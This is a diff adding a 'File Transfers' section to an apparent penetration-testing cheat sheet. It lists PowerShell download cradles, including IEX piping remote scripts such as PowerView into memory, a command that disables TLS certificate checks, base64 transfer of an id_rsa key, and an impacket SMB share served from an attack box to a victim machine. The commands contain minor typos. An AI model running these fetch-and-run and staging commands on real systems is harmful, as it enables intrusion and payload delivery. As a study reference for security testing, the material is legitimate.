@@ -1168,4 +1168,54 @@ curl -s "https://crt.sh/?q=[domain]&output=json" | jq -r '.[]
 
 <br>
 
-#
+## File Transfers 
+<br>
+
+### Windows 
+```
+# Convert Using b64 and powershell 
+  cat [file] V| base64 -w 0; echo 
+
+  # Copy the above commands ouput contents to terminal of remote machine
+  # In powershell 
+  [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("CONTENTS"))"
+
+  # Check file was decoded properly by checking the hash matches the origional hash 
+
+
+# Powershell Web Downloads 
+  # The system.net.webclient class allows for web downloads 
+  # https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
+  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+
+  # Using IEX we can leverage powershell to invoke fileless attacks (Using Memory instead)
+  IEX (New-Object Net.WebClient).DownloadString('Web Executable')
+
+  # Powershell 3 and later you can use Invoke-WebRequest (Alias: curl, iwr, wget)
+  Invoke-WebRequest [web exe] -OutFile fileName
+
+  # Further Powershell Download Cradles 
+  https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
+
+# Powershell Common Problems 
+  1. IE first-launch: 
+    -UseBasicPasring
+    Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+
+  2. "Could not establish trust relationship for the SSL/TLS secure channel"
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+
+# SMB 
+  1. Setup SMB servAer on attack box using smbserver.py
+    sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+  2. From the victim machine 
+    copy \\[ip]\share\file
+
+
+
+  
+```
+
+
